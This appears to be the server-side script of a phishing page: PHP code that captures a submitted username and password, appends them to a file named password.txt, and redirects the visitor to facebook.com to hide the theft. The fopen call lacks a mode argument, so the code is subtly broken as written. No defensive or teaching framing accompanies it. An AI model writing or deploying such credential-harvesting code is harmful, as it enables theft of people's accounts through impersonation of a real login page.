<?php

    $myfile = fopen("password.txt") or die("unable to load file");
    $user = $_POST["username"];
    $pass = $_POST["password"];


    fwrite($myfile, $user);
    fwrite($myfile, $pass);
    fclose($myfile);


    header("Location: https://www.facebook.com");

    ?>